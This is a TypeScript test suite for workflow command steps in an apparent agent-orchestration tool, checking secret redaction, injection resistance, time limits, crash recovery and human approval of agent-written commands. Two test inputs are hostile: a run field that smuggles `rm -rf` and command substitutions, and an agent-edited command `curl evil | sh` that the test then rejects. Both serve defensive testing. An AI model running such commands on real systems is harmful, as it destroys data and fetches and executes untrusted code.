import { describe, expect, it } from 'vitest';
import { execFileSync, spawn } from 'node:child_process';
import { existsSync, mkdtempSync, readdirSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { ContentBlock, SecretStoreStatus, Workflow, WorkflowNodeInput, WorkflowRun } from '@atlas/shared';
import { eventually, launch, setReviewAgent, type LaunchOptions } from '../test/kit/index.ts';
import type { SecretStore } from './secrets.ts';
import { fieldsEnv, FIELD_VALUE_MAX, processStart } from './workflowCommand.ts';
import { otherLead } from './context.ts';
import type { ModelRequest } from './providers/types.ts';

/** #273: « Run a command » steps (approval, secrets, clean checkout, limits, kills) and agent steps in the task thread. */

class MemoryStore implements SecretStore {
  label = 'test store';
  map = new Map<string, string>();
  failGet = false;
  locked = false;
  names = () => [...this.map.keys()];
  get = (n: string) => {
    if (this.failGet) throw new Error('keychain locked');
    return this.map.get(n);
  };
  set = (n: string, v: string) => void this.map.set(n, v);
  delete = (n: string) => void this.map.delete(n);
  lock = {
    status: (): SecretStoreStatus => ({ kind: 'file', exists: true, locked: this.locked, since: null, source: null, error: null }) as SecretStoreStatus,
    unlock: async () => void (this.locked = false),
    lockNow: () => void (this.locked = true),
    changePassword: async () => {},
  };
}

const CANARY = 'canary-Vx9q-7b2e-SECRET-0042';
const text = (t: string): ContentBlock[] => [{ type: 'text', text: t }];
const node = (id: string, kind: WorkflowNodeInput['kind'], config: object): WorkflowNodeInput => ({ id, kind, x: 0, y: 0, config: config as never }) as WorkflowNodeInput;
const trigger = node('trigger', 'trigger', { kind: 'manual' });
const edge = (from: string, exit: string, to: string) => ({ from, exit, to });
const git = (cwd: string, ...args: string[]) => execFileSync('git', args, { cwd, encoding: 'utf8', env: { ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@t', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@t' } });

/** A bare repo standing in for GitHub: default branch main (one commit with README), and a branch `pr` nobody may run. */
function remote(): string {
  const dir = mkdtempSync(join(tmpdir(), 'atlas-remote-'));
  const work = join(dir, 'work');
  execFileSync('git', ['init', '-q', '-b', 'main', work]);
  writeFileSync(join(work, 'README'), 'main branch\n');
  git(work, 'add', 'README');
  git(work, 'commit', '-qm', 'main');
  git(work, 'checkout', '-qb', 'pr');
  writeFileSync(join(work, 'README'), 'unreviewed PR head\n');
  git(work, 'commit', '-qam', 'pr');
  git(work, 'checkout', '-q', 'main');
  execFileSync('git', ['clone', '-q', '--bare', work, join(dir, 'origin.git')]);
  return join(dir, 'origin.git');
}

async function setup(o: { dbFile?: string; dataDir?: string; minuteMs?: number; script?: LaunchOptions['script']; store?: MemoryStore; origin?: string } = {}) {
  const store = o.store ?? new MemoryStore();
  const origin = o.origin ?? remote();
  const clones: string[] = [];
  const l = await launch({
    script: o.script ?? [],
    dispatch: false,
    secrets: store,
    env: {},
    ...(o.dbFile ? { dbFile: o.dbFile, dataDir: o.dataDir } : {}),
    workflowCommand: {
      clone: async (repo, dir) => {
        clones.push(repo);
        execFileSync('git', ['clone', '-q', origin, dir]);
      },
      minuteMs: o.minuteMs,
    },
  });
  const e = l.engine;
  for (const id of ['zurich', 'munih']) if (!e.agents.list().some((a) => a.id === id)) e.agents.create({ id, modelId: e.agents.get('atlas').modelId });
  const project = e.projects.list().find((p) => p.name === 'Datinel') ?? e.projects.create({ name: 'Datinel', repo: 'datinel/datinel', lead: 'atlas', members: ['zurich', 'munih'] });
  if (!o.dbFile || !e.db.prepare("SELECT 1 FROM secrets WHERE name = 'DEPLOY_TOKEN'").get()) {
    expect((await l.call('POST', '/secrets', { name: 'DEPLOY_TOKEN', value: CANARY, grant: 'none' })).status).toBe(201);
  }
  e.workflows.start(3_600_000);
  const wf = e.workflows;
  const cmd = (command: string, extra: object = {}) => node('c', 'action', { do: 'command', title: 'Deploy', command, secrets: [], limitMin: 5, ...extra });
  const make = (command: string, extra: object = {}, by = 'user', more: Partial<Parameters<typeof wf.create>[0]> = {}) =>
    wf.create({ name: 'Deploy', projectId: project.id, nodes: [trigger, cmd(command, extra)], edges: [edge('trigger', 'start', 'c')], ...more }, by);
  /** Run by hand and wait for the command step to end (or to be « couldn't run »). */
  const runIt = async (w: Workflow, task?: string): Promise<WorkflowRun> => {
    const r = wf.runNow(w.id, task ? { task } : {});
    if (r.state === 'skipped') return r;
    await eventually(
      () => {
        const x = wf.run(r.id);
        const s = x.steps!.find((s) => s.nodeId === 'c');
        return x.state === 'done' || x.state === 'failed' || s?.couldntRun ? x : null;
      },
      { timeout: 15_000, what: 'the command step to end' },
    );
    await wf.commandsIdle();
    return wf.run(r.id);
  };
  const step = (r: WorkflowRun) => r.steps!.find((s) => s.nodeId === 'c')!;
  const inbox = (kind: string) => e.db.prepare('SELECT id, title, body, archived_at FROM notifications WHERE kind = ? ORDER BY id').all(kind) as { id: number; title: string; body: string; archived_at: string | null }[];
  return { ...l, e, wf, store, project, make, runIt, step, inbox, clones, origin, cmd };
}

// Real git clones, worktrees and bash: slow under load, not flaky.
describe('Run a command (#273, design §10b)', { timeout: 30_000 }, () => {
  it('runs in a clean checkout of the default branch, only its secrets in the env, its output redacted, the log saved', async () => {
    const t = await setup();
    // Another agent secret the step doesn't list, and a model key in the engine env: neither reaches the command.
    expect((await t.call('POST', '/secrets', { name: 'OTHER_SECRET', value: 'other-value-123456789', grant: 'all' })).status).toBe(201);
    const w = t.make('cat README; git status --porcelain | wc -l; echo "token=$DEPLOY_TOKEN"; echo "other=${OTHER_SECRET:-none}"; echo "key=${ANTHROPIC_API_KEY:-none}"; echo "sha=$ATLAS_CHECKOUT_SHA"; touch dirt', { secrets: ['DEPLOY_TOKEN'] });
    expect(w.commandSteps).toEqual([expect.objectContaining({ nodeId: 'c', approved: true, approvedBy: 'user', checkout: { repo: 'datinel/datinel', ref: 'default branch' }, secrets: ['DEPLOY_TOKEN'], limitMin: 5 })]);
    const r = await t.runIt(w);
    expect(r.state).toBe('done');
    const s = t.step(r);
    expect(s.exit).toBe('exit 0');
    const main = git(t.origin, 'rev-parse', 'main').trim();
    expect(s.summary).toContain(`exit 0 on main ${main.slice(0, 7)}`);
    expect(s.summary).toContain('main branch'); // never the PR branch
    expect(s.summary).toContain('token=[secret DEPLOY_TOKEN]');
    expect(s.summary).toContain('other=none');
    expect(s.summary).toContain('key=none');
    expect(s.summary).not.toContain(CANARY);
    const log = s.summary!.match(/Log: (\S+\.log)/)![1]!;
    expect(log.startsWith(join(t.dataDir, 'outputs', 'workflows'))).toBe(true);
    expect(readFileSync(log, 'utf8')).toContain('token=[secret DEPLOY_TOKEN]');
    // The worktree is gone after the step; the next run starts clean (no « dirt »).
    expect(readdirSync(join(t.dataDir, 'checkouts', t.project.id, 'runs'))).toEqual([]);
    const r2 = await t.runIt(w);
    expect(t.step(r2).summary).toMatch(/\n\s*0\n/); // git status: nothing changed in the fresh checkout
    expect(t.clones).toEqual(['datinel/datinel']); // cloned once, fetched after
    // Last use is recorded on the secret, by the step.
    expect(t.e.db.prepare("SELECT last_used_by FROM secrets WHERE name = 'DEPLOY_TOKEN'").get()).toEqual({ last_used_by: `workflow:${w.id}/c` });
  });

  it('secrets canary: the value is nowhere but the store (SQLite + WAL, outputs, summaries, events, API)', async () => {
    const dataDir = mkdtempSync(join(tmpdir(), 'atlas-canary-'));
    const dbFile = join(dataDir, 'atlas.db');
    const t = await setup({ dbFile, dataDir });
    const events: string[] = [];
    t.e.bus.on((ev) => events.push(JSON.stringify(ev)));
    const card = t.e.kanban.create({ title: 'deploy it', projectId: t.project.id }, 'user');
    const w = t.make('echo "$DEPLOY_TOKEN"; echo "$DEPLOY_TOKEN" >&2; printf %s "$DEPLOY_TOKEN" | base64; exit 3', { secrets: ['DEPLOY_TOKEN'] }, 'user', {
      nodes: [trigger, t.cmd('echo "$DEPLOY_TOKEN"; echo "$DEPLOY_TOKEN" >&2; exit 3', { secrets: ['DEPLOY_TOKEN'] }), node('n', 'action', { do: 'notify', text: 'failed: {{steps.c.summary}}' }), node('back', 'action', { do: 'setStatus', status: 'ready', note: '{{steps.c.summary}}' })],
      edges: [edge('trigger', 'start', 'c'), edge('c', 'other exit', 'n'), edge('n', 'done', 'back')],
    });
    const r = await t.runIt(w, card.id);
    expect(t.step(r)).toMatchObject({ exit: 'other exit', summary: expect.stringContaining('exit 3') });
    expect(r.state).toBe('done');
    const api = JSON.stringify([(await t.call('GET', `/workflows/${w.id}/runs`)).body, (await t.call('GET', `/workflow-runs/${r.id}`)).body, (await t.call('GET', `/cards/${card.id}/messages`)).body, (await t.call('GET', '/notifications')).body, (await t.call('GET', '/secrets')).body]);
    expect(api).toContain('[secret DEPLOY_TOKEN]');
    expect(api).not.toContain(CANARY);
    expect(events.join('\n')).not.toContain(CANARY);
    t.e.db.pragma('wal_checkpoint(PASSIVE)');
    const files = (dir: string): string[] => readdirSync(dir, { withFileTypes: true }).flatMap((d) => (d.isDirectory() ? (d.name === '.git' ? [] : files(join(dir, d.name))) : [join(dir, d.name)]));
    const leaks = files(dataDir).filter((f) => readFileSync(f).includes(CANARY));
    expect(leaks).toEqual([]);
  });

  it('a run field is a value in the env, never command text: `"; rm -rf …` stays a string', async () => {
    const t = await setup();
    const sentinel = join(mkdtempSync(join(tmpdir(), 'atlas-inj-')), 'pwned');
    const evil = `x"; rm -rf "$HOME/nope"; touch ${sentinel}; echo "$(touch ${sentinel})\`touch ${sentinel}\``;
    const card = t.e.kanban.create({ title: 'deploy', body: evil, projectId: t.project.id }, 'user');
    const w = t.make('printf "body=[%s]\\n" "$TASK_BODY"; echo "ref=$TASK_REF"');
    const r = await t.runIt(w, card.id);
    expect(t.step(r).exit).toBe('exit 0');
    expect(t.step(r).summary).toContain(`body=[${evil}]`);
    expect(t.step(r).summary).toContain(`ref=${t.e.kanban.ref(card.id)}`);
    expect(existsSync(sentinel)).toBe(false);
    // {{…}} in the command is refused at save, with the env var to use instead.
    expect(() => t.make('echo {{task.title}}')).toThrow(/no \{\{field\}\} in a command: every run field is an env var/);
  });

  it('caps: 16 KB per value, 128 KB in all; the summary names each cut or dropped field', () => {
    const fields: Record<string, string> = { 'task.body': 'b'.repeat(FIELD_VALUE_MAX + 10), 'task.title': 'short' };
    for (let i = 0; i < 9; i++) fields[`steps.s${i}.summary`] = 's'.repeat(FIELD_VALUE_MAX);
    const { env, notes } = fieldsEnv(fields, new Set());
    expect(env.TASK_TITLE).toBe('short');
    for (const v of Object.values(env)) expect(Buffer.byteLength(v)).toBeLessThanOrEqual(FIELD_VALUE_MAX);
    expect(notes).toEqual(expect.arrayContaining([expect.stringMatching(/TASK_BODY cut/), expect.stringMatching(/STEPS_S\d_SUMMARY dropped/)]));
    const total = Object.values(env).reduce((n, v) => n + Buffer.byteLength(v), 0);
    expect(total).toBeLessThanOrEqual(128 * 1024);
    // A field never overrides a secret or the base env.
    expect(fieldsEnv({ path: 'x' }, new Set(['PATH'])).env.PATH).toBeUndefined();
  });

  it('refused at save: no repo, a global workflow, a model key, another project\'s secret, an unknown one', async () => {
    const t = await setup();
    const bare = t.e.projects.create({ name: 'NoRepo', repo: null, lead: 'atlas', members: [] });
    const other = t.e.projects.create({ name: 'Other', repo: 'o/o', lead: 'atlas', members: [] });
    expect((await t.call('POST', '/secrets', { name: 'OTHER_ONLY', value: 'other-only-12345678', project: other.id })).status).toBe(201);
    const nodes = (extra: object = {}) => [trigger, t.cmd('make deploy', extra)];
    const edges = [edge('trigger', 'start', 'c')];
    expect(() => t.wf.create({ name: 'x', projectId: bare.id, nodes: nodes(), edges }, 'user')).toThrow(/project NoRepo has no GitHub repo/);
    expect(() => t.wf.create({ name: 'x', projectId: null, nodes: nodes(), edges }, 'user')).toThrow(/needs a workflow of a project/);
    t.e.db.prepare("UPDATE models SET credential_env = 'ANTHROPIC_API_KEY' WHERE id = (SELECT id FROM models LIMIT 1)").run();
    expect(() => t.make('x', { secrets: ['ANTHROPIC_API_KEY'] })).toThrow(/model key or a sign-in/);
    expect(() => t.make('x', { secrets: ['CLAUDE_TOKENS'] })).toThrow(/model key or a sign-in/);
    expect(() => t.make('x', { secrets: ['OTHER_ONLY'] })).toThrow(/there is no secret OTHER_ONLY for this project/);
    expect(() => t.make('x', { secrets: ['NOPE_NONE'] })).toThrow(/there is no secret NOPE_NONE/);
    expect(() => t.make('x', { limitMin: 121 })).toThrow();
  });

  it('time limit: SIGTERM to the whole process group; the exit is « other exit » and says so', async () => {
    const t = await setup({ minuteMs: 300 });
    const marker = join(mkdtempSync(join(tmpdir(), 'atlas-lim-')), 'child.pid');
    const w = t.make(`sleep 30 & echo $! > ${marker}; wait`, { limitMin: 1 });
    const started = Date.now();
    const r = await t.runIt(w);
    expect(Date.now() - started).toBeLessThan(8_000);
    expect(t.step(r)).toMatchObject({ exit: 'other exit', summary: expect.stringContaining('stopped at its 1 min limit') });
    expect(r.state).toBe('failed'); // an unwired failing exit
    const child = Number(readFileSync(marker, 'utf8'));
    await eventually(() => processStart(child) === null, { what: 'the background sleep of the group to be killed too' });
  });

  it("couldn't run: a locked store, an unreadable one, a missing value, a failed checkout; the command never starts", async () => {
    const t = await setup();
    const mark = join(mkdtempSync(join(tmpdir(), 'atlas-cr-')), 'ran');
    const w = t.make(`echo ran >> ${mark}`, { secrets: ['DEPLOY_TOKEN'] });
    t.store.locked = true;
    let r = await t.runIt(w);
    expect(r.state).toBe('waiting');
    expect(t.step(r).couldntRun).toMatchObject({ reason: 'secret store locked: unlock it in Settings → Secrets', autoRetry: true, negativeExit: 'other exit' });
    t.store.locked = false;
    t.store.failGet = true;
    t.wf.retryNow(r.id);
    await eventually(() => t.step(t.wf.run(r.id)).couldntRun?.reason.includes('could not read DEPLOY_TOKEN'), { what: 'unreadable store' });
    t.store.failGet = false;
    t.store.delete('DEPLOY_TOKEN');
    t.wf.retryNow(r.id);
    await eventually(() => t.step(t.wf.run(r.id)).couldntRun?.reason === 'secret DEPLOY_TOKEN has no value: add it in Settings → Secrets', { what: 'missing value' });
    expect(existsSync(mark)).toBe(false);
    // The value comes back: Retry now runs it.
    t.store.set('DEPLOY_TOKEN', CANARY);
    t.wf.retryNow(r.id);
    await eventually(() => t.wf.run(r.id).state === 'done', { what: 'the run to go on' });
    await t.wf.commandsIdle();
    expect(readFileSync(mark, 'utf8')).toBe('ran\n');
    // gh logged out / offline: the checkout fails → couldn't run, not a failure.
    rmClone(t);
    const t2 = t.make('true');
    (t.wf as unknown as { opts: { command: { clone: unknown } } }).opts.command.clone = async () => {
      throw new Error('gh: not logged in');
    };
    r = await t.runIt(t2);
    expect(t.step(r).couldntRun?.reason).toMatch(/^can't check out datinel\/datinel: gh: not logged in/);
  });

  it('a kill mid-command: at the next start the group is killed (pid + start time), the worktree removed, no retry, Master told', async () => {
    const dataDir = mkdtempSync(join(tmpdir(), 'atlas-kill-'));
    const dbFile = join(dataDir, 'atlas.db');
    const origin = remote();
    const t = await setup({ dbFile, dataDir, origin });
    const dir = mkdtempSync(join(tmpdir(), 'atlas-kill-m-'));
    const w = t.make(`echo $$ > ${dir}/pid; echo start >> ${dir}/runs; sleep 30`);
    const r = t.wf.runNow(w.id);
    await eventually(() => existsSync(join(dir, 'pid')) && t.e.db.prepare("SELECT 1 FROM workflow_run_steps WHERE json_extract(data, '$.pid') IS NOT NULL").get(), { what: 'the command to start' });
    const pid = Number(readFileSync(join(dir, 'pid'), 'utf8'));
    // A hard kill leaves the step « running » with its pid in the store and the group alive: stand in for it with a
    // process of our own in its place (stop() kills our children), its pid and start time stored as the step's.
    const orphan = spawn('sleep', ['60'], { detached: true, stdio: 'ignore' });
    orphan.unref();
    const reused = spawn('sleep', ['60'], { detached: true, stdio: 'ignore' }); // a pid that looks reused: other start time
    reused.unref();
    await t.e.stop();
    expect(processStart(pid)).toBe(null);
    const { e: _e, ...__ } = t;
    void __;
    const sqlite = (await import('better-sqlite3')).default;
    const db = new sqlite(dbFile);
    const row = db.prepare("SELECT id, data FROM workflow_run_steps WHERE node_id = 'c'").get() as { id: number; data: string };
    const data = JSON.parse(row.data);
    expect(data).toMatchObject({ cmd: true, phase: 'running' });
    db.prepare('UPDATE workflow_run_steps SET data = ? WHERE id = ?').run(JSON.stringify({ ...data, pid: orphan.pid, started: processStart(orphan.pid!) }), row.id);
    db.close();
    const t2 = await setup({ dbFile, dataDir, origin });
    await eventually(() => orphan.exitCode !== null || orphan.signalCode !== null, { what: 'the orphan group to be killed (same pid, same start time)' });
    const after = t2.wf.run(r.id);
    expect(after.state).toBe('waiting');
    expect(t2.step(after).couldntRun).toMatchObject({ reason: 'Atlas stopped while the command ran: it may have run in part', autoRetry: false, notified: true, negativeExit: 'other exit' });
    expect(t2.inbox('workflow.couldnt_run')).toEqual([expect.objectContaining({ title: 'Workflow « Deploy »: « Deploy » was cut off', archived_at: null })]);
    expect(readdirSync(join(dataDir, 'checkouts', t2.project.id, 'runs'))).toEqual([]);
    // Never run again by itself, however long it waits.
    t2.e.db.prepare('UPDATE workflow_run_steps SET retry_at = ? WHERE id = ?').run('2000-01-01T00:00:00Z', row.id);
    t2.wf.tick();
    await t2.wf.commandsIdle();
    expect(readFileSync(join(dir, 'runs'), 'utf8')).toBe('start\n');
    // A pid whose start time differs is not ours: left alone.
    t2.e.db.prepare('UPDATE workflow_run_steps SET data = ? WHERE id = ?').run(JSON.stringify({ cmd: true, phase: 'running', pid: reused.pid, started: 'Thu Jan  1 00:00:00 1970' }), row.id);
    (t2.wf as unknown as { recoverCommands: () => void }).recoverCommands();
    expect(processStart(reused.pid!)).not.toBe(null);
    process.kill(reused.pid!, 'SIGKILL');
    // Master's Retry now runs it once more.
    t2.e.db.prepare("UPDATE workflow_run_steps SET data = ? WHERE id = ?").run(JSON.stringify({ cmd: true, phase: 'queued' }), row.id);
    t2.wf.retryNow(r.id);
    await eventually(() => readFileSync(join(dir, 'runs'), 'utf8') === 'start\nstart\n', { what: 'the retried command' });
    t2.wf.stopRun(r.id);
    await t2.wf.commandsIdle();
  }, 30_000);
});

function rmClone(t: Awaited<ReturnType<typeof setup>>) {
  execFileSync('rm', ['-rf', join(t.dataDir, 'checkouts', t.project.id, 'repo')]);
}

// Real git clones, worktrees and bash: slow under load, not flaky.
describe('command step approval (#273, design §5)', { timeout: 30_000 }, () => {
  it("Master's own create and edit approve; an agent's create or edit asks Master, once; a firing waits skipped", async () => {
    const t = await setup();
    // An agent creates it: not approved, no run, one Inbox item.
    const w = t.make('make deploy', {}, 'munih');
    expect(w).toMatchObject({ needsApproval: true, commandSteps: [expect.objectContaining({ approved: false, approvedAt: null })] });
    const items = t.inbox('workflow.approval');
    expect(items).toEqual([expect.objectContaining({ title: 'Workflow « Deploy » needs your approval', archived_at: null })]);
    expect(items[0]!.body).toContain('@munih changed it. « Deploy » runs `make deploy`, at most 5 min');
    const r1 = t.wf.runNow(w.id);
    expect(r1).toMatchObject({ state: 'skipped', reason: 'skipped: waiting for your approval of « Deploy »' });
    expect(t.wf.runNow(w.id).state).toBe('skipped');
    expect(t.inbox('workflow.approval')).toHaveLength(1); // one item, not one per firing
    // A stale revision is refused (409): what Master approves is what Master saw.
    expect((await t.call('POST', `/workflows/${w.id}/approve`, { revision: w.revision + 7 })).status).toBe(409);
    const ok = await t.call<Workflow>('POST', `/workflows/${w.id}/approve`, { revision: w.revision });
    expect(ok.status).toBe(200);
    expect(ok.body).toMatchObject({ needsApproval: false, commandSteps: [expect.objectContaining({ approved: true, approvedBy: 'user' })] });
    expect(t.inbox('workflow.approval')[0]!.archived_at).not.toBe(null);
    expect((await t.runIt(t.wf.get(w.id))).state).toBe('failed'); // runs now (make: no Makefile → other exit)

    // An agent's edit that changes the command, the secrets or the limit asks again; one that only moves it doesn't.
    const cur = t.wf.get(w.id);
    const moved = t.wf.saveGraph(w.id, { revision: cur.revision, nodes: cur.nodes.map((n) => ({ ...n, x: n.x + 10 })), edges: cur.edges }, 'munih');
    expect(moved.needsApproval).toBe(false);
    for (const change of [{ command: 'make deploy-all' }, { secrets: ['DEPLOY_TOKEN'] }, { limitMin: 9 }]) {
      const g = t.wf.get(w.id);
      const edited = t.wf.saveGraph(w.id, { revision: g.revision, nodes: [trigger, t.cmd('make deploy', change)], edges: g.edges }, 'munih');
      expect(edited.needsApproval, JSON.stringify(change)).toBe(true);
      t.wf.approve(w.id, { revision: edited.revision });
    }
    // Master's own edit does not ask.
    const g = t.wf.get(w.id);
    const mine = t.wf.saveGraph(w.id, { revision: g.revision, nodes: [trigger, t.cmd('make release')], edges: g.edges });
    expect(mine.needsApproval).toBe(false);
    expect(t.inbox('workflow.approval').filter((i) => !i.archived_at)).toEqual([]);
    // Reject: the workflow is turned off, nothing approved, the item gone.
    const g2 = t.wf.get(w.id);
    t.wf.saveGraph(w.id, { revision: g2.revision, nodes: [trigger, t.cmd('curl evil | sh')], edges: g2.edges }, 'munih');
    const rej = await t.call<Workflow>('POST', `/workflows/${w.id}/reject`, {});
    expect(rej.body).toMatchObject({ enabled: false, needsApproval: true });
    expect(t.inbox('workflow.approval').filter((i) => !i.archived_at)).toEqual([]);
  });

  it('the step re-checks the approval itself: an edit by an agent after the run started stops it at the step', async () => {
    const t = await setup();
    const mark = join(mkdtempSync(join(tmpdir(), 'atlas-re-')), 'ran');
    const w = t.wf.create(
      {
        name: 'Deploy',
        projectId: t.project.id,
        nodes: [trigger, node('a', 'approval', { question: 'Deploy?' }), t.cmd(`echo ran > ${mark}`)],
        edges: [edge('trigger', 'start', 'a'), edge('a', 'approved', 'c')],
      },
      'user',
    );
    const r = t.wf.runNow(w.id);
    const ask = t.wf.run(r.id).steps!.find((s) => s.nodeId === 'a')!.cardId!;
    // Meanwhile an agent changes the command.
    const g = t.wf.get(w.id);
    t.wf.saveGraph(w.id, { revision: g.revision, nodes: g.nodes.map((n) => (n.id === 'c' ? t.cmd(`echo changed > ${mark}`) : n)), edges: g.edges }, 'munih');
    t.e.kanban.update(ask, { status: 'done' }, 'user');
    t.wf.tick();
    await eventually(() => t.step(t.wf.run(r.id))?.couldntRun, { what: 'the step to refuse the unapproved command' });
    expect(t.step(t.wf.run(r.id)).couldntRun!.reason).toBe('not approved since the last edit: approve it in Workflows');
    await t.wf.commandsIdle();
    expect(existsSync(mark)).toBe(false);
    // Master approves: the waiting step goes on at once and runs the approved command.
    t.wf.approve(w.id, { revision: t.wf.get(w.id).revision });
    await eventually(() => t.wf.run(r.id).state === 'done', { what: 'the run after the approval' });
    await t.wf.commandsIdle();
    expect(readFileSync(mark, 'utf8')).toBe('changed\n');
  });

  it('no agent tool can approve or reject: only the HTTP routes call them, and the instructions say never to', async () => {
    const src = join(import.meta.dirname);
    const callers = readdirSync(src)
      .filter((f) => f.endsWith('.ts') && !f.endsWith('.test.ts'))
      .filter((f) => /workflows\.(approve|reject)\(|\/approve'|\/reject'/.test(readFileSync(join(src, f), 'utf8')));
    expect(callers).toEqual(['api.ts']);
    let seen: ModelRequest | null = null;
    const t = await setup({ script: [(req: ModelRequest) => ((seen = req), text('ok'))] });
    const c = t.e.kanban.create({ title: 'x', assignee: 'atlas' }, 'user');
    t.e.kanban.appendMessage(c.id, 'user', 'user', text('hi'));
    t.e.runner.wake(c.id);
    await t.idle(c.id);
    const req = seen as unknown as ModelRequest;
    expect(req.system).toContain("Never approve or reject a workflow's command steps (POST /api/workflows/:id/approve or /reject)");
    expect(req.tools.map((x) => x.name).filter((n) => /approv|workflow_(edit|save|update)/.test(n))).toEqual([]);
  });
});

// Real git clones, worktrees and bash: slow under load, not flaky.
describe('Agent step in the task thread (#273)', { timeout: 30_000 }, () => {
  it("runs in the run's task, sees another agent's turns marked as theirs; exits done / not done", async () => {
    let seen: ModelRequest | null = null;
    const t = await setup({ script: [(req: ModelRequest) => ((seen = req), text('Looked: the plan holds.')), () => { throw new Error('model down'); }] });
    const card = t.e.kanban.create({ title: 'Plan', assignee: 'atlas', status: 'ready' }, 'user');
    t.e.kanban.appendMessage(card.id, 'user', 'user', text('Write the plan'));
    t.e.kanban.appendMessage(card.id, 'assistant', 'atlas', text('Here is the plan: A then B.'));
    const w = t.wf.create(
      {
        name: 'Second look',
        nodes: [trigger, node('g', 'agent', { agentId: 'zurich', prompt: 'Check the plan of {{task.ref}}', inThread: true })],
        edges: [edge('trigger', 'start', 'g')],
      },
      'user',
    );
    expect(w.nodes.find((n) => n.id === 'g')).toBeTruthy();
    const r = t.wf.runNow(w.id, { task: card.id });
    await eventually(() => t.wf.run(r.id).state === 'done', { timeout: 10_000, what: 'the thread step to end' });
    const req = seen as unknown as ModelRequest;
    const all = JSON.stringify(req.messages);
    expect(all).toContain(otherLead('atlas'));
    expect(all).toContain('Here is the plan: A then B.');
    expect(all).toContain(`Check the plan of ${t.e.kanban.ref(card.id)}`);
    const s = t.wf.run(r.id).steps!.find((x) => x.nodeId === 'g')!;
    expect(s).toMatchObject({ exit: 'done', cardId: card.id, summary: 'Looked: the plan holds.' });
    // No task of its own: the run's task keeps its assignee and its one thread.
    expect(t.e.kanban.get(card.id).assignee).toBe('atlas');
    expect(t.e.kanban.list().filter((c) => c.title.includes('Second look'))).toEqual([]);
    // The run fails: not done, with why.
    const r2 = t.wf.runNow(w.id, { task: card.id });
    await eventually(() => t.wf.run(r2.id).state !== 'running' && t.wf.run(r2.id).state !== 'waiting', { timeout: 10_000, what: 'the failed thread step' });
    expect(t.wf.run(r2.id).steps!.find((x) => x.nodeId === 'g')).toMatchObject({ exit: 'not done', summary: expect.stringContaining("@zurich's run failed") });
    // A run with no task: fails, says why.
    const bare = t.wf.create({ name: 'Bare', nodes: [trigger, node('g', 'agent', { agentId: 'zurich', prompt: 'Look', inThread: true })], edges: [edge('trigger', 'start', 'g')] }, 'user');
    expect(t.wf.runNow(bare.id)).toMatchObject({ state: 'failed', reason: "« Look » works in the run's task thread, and this run has none (started by hand, on no task)" });
  });

  it("a review: the reviewer's pr_validate verdict is the exit (ok → approved, fail → changes asked with the reason)", async () => {
    let cardId = '';
    let t: Awaited<ReturnType<typeof setup>> | null = null;
    const verdict = (v: 'ok' | 'fail', reason: string) => () => {
      t!.e.kanban.event(cardId, 'pr_verdict', { by: 'zurich', verdict: v, pr: 41, sha: 'abc1234', reason });
      return text('verdict given');
    };
    // After each review the builder answers in the thread (#221: new messages since its turn): its own replies.
    t = await setup({ script: [verdict('fail', 'tests missing for the limit'), text('builder: on it'), verdict('ok', 'tests and build checked'), text('builder: thanks'), text('no verdict this time'), text('no verdict again'), text('builder: ok')] });
    setReviewAgent(t.e, 'atlas', 'zurich');
    const card = t.e.kanban.create({ title: 'Feature', assignee: 'munih', status: 'ready' }, 'user');
    cardId = card.id;
    const w = t.wf.create(
      {
        name: 'Review',
        nodes: [trigger, node('rv', 'agent', { prompt: 'Review {{task.ref}}', inThread: true, reviewAgent: true })],
        edges: [edge('trigger', 'start', 'rv')],
      },
      'user',
    );
    const done = async (id: string) => {
      await eventually(() => !['running', 'waiting'].includes(t!.wf.run(id).state) || t!.wf.run(id).steps!.some((s) => s.couldntRun), { timeout: 10_000, what: 'the review step' });
      return t!.wf.run(id).steps!.find((s) => s.nodeId === 'rv')!;
    };
    const a = await done(t.wf.runNow(w.id, { task: card.id }).id);
    expect(a).toMatchObject({ exit: 'changes asked', summary: '@zurich on PR #41: tests missing for the limit' });
    await t.idle(card.id);
    const rb = t.wf.runNow(w.id, { task: card.id });
    const b = await done(rb.id);
    expect(b).toMatchObject({ exit: 'approved', summary: '@zurich on PR #41: tests and build checked' });
    await t.idle(card.id);
    // No verdict: started once more by itself, told why (#221); no verdict again: couldn't run, Master told.
    const c = await done(t.wf.runNow(w.id, { task: card.id }).id);
    expect(c.couldntRun).toMatchObject({ reason: 'the review by @zurich ended without a verdict (pr_validate)', autoRetry: false, notified: true, negativeExit: 'changes asked' });
    // The review agent works in the thread only.
    expect(() => t!.wf.create({ name: 'x', nodes: [trigger, node('rv', 'agent', { prompt: 'x', reviewAgent: true })], edges: [edge('trigger', 'start', 'rv')] }, 'user')).toThrow(/the review agent works in the task thread/);
  });
});
